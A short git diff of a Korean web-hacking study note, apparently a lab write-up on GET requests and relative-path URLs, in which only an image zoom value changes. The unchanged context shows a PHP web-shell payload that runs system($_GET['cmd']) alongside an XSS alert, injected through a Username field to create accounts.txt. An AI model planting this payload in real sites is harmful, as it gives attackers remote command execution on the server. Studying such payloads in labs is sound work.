@@ -71,7 +71,9 @@ GET 방식으로 HTTP 요청을 사용하는 웹 페이지의 URL에 상대경�
 
 ![image-20211101202631536](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211101202631536.png)
 
-<img src="image-20211109231912842.png" alt="image-20211109231912842" style="zoom: 84%;" />
+
+
+<img src="image-20211109231912842.png" alt="image-20211109231912842" style="zoom: 83%;" />
 
 - <?php echo "<script>alert(\"Succeed\")</script>";system($_GET["cmd"]);?>
 - 해당 스크립트 Username에 삽입하여 [insert] 버튼으로 경고창 스크립트 파일(accounts.txt) 생성
